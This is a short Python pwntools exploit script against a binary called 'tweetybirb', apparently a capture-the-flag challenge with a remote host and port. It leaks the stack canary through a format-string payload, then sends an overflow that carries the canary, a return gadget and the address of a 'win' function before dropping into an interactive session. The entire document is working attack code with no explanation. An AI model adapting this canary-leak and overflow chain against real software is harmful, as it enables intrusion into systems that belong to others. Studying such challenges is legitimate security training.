#!/usr/bin/python3
import pwn
path = './tweetybirb'
elf = pwn.context.binary = pwn.ELF(path)
if pwn.args.GDB:
    io = pwn.gdb.debug(path, gdbscript="")
else:
    if pwn.args.REMOTE:
        io = pwn.remote("143.198.184.186", 5002)
    else:
        io = elf.process()
mssg = io.recv(4096)
OFFSET = 72
payload = b"%15$llx"
io.sendline(payload)
leak = io.recvline(keepends=False)
leak = b"0x"+leak
leak = int(leak, 16)
print(hex(leak))
ret = 0x000000000040101a
mssg = io.recv(4096)
payload2 = b"A"*72
payload2 += pwn.p64(leak)
payload2 += b"A"*8
payload2 += pwn.p64(ret)
payload2 += pwn.p64(elf.sym.win)
io.sendline(payload2)
io.interactive()
